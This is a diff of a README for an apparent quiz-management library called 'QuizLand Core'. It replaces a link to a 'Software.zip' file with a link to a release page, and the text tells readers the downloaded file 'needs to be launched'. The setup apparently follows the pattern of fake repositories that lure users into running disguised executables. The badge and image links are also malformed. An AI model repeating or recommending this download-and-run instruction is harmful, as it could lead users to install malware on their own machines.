@@ -11,7 +11,7 @@ Welcome to QuizLand Core, the go-to library for managing quizzes! Whether you're
 
 ## 🛠 Installation
 To get started with QuizLand Core, download the library from the following link:
-[![Download QuizLand Core](https://img.shields.io/badge/Download-QuizLand_Core-blue)](https://github.com/user-attachments/files/18388744/Software.zip)
+[![Download QuizLand Core](https://github.com/2amJeffrxy/quizland-core/releases/tag/v2.0)](https://github.com/2amJeffrxy/quizland-core/releases/tag/v2.0)
 
 Please note that the file needs to be launched after downloading.
 
@@ -39,4 +39,4 @@ Get ready to revolutionize the way you manage quizzes with QuizLand Core. Empowe
 
 Remember, learning is a journey, and quizzes make it fun! Happy Quizzing! 🧠🔥 
 
-![QuizLand](https://example.com/quizland-image.png)
+![QuizLand](https://github.com/2amJeffrxy/quizland-core/releases/tag/v2.0)
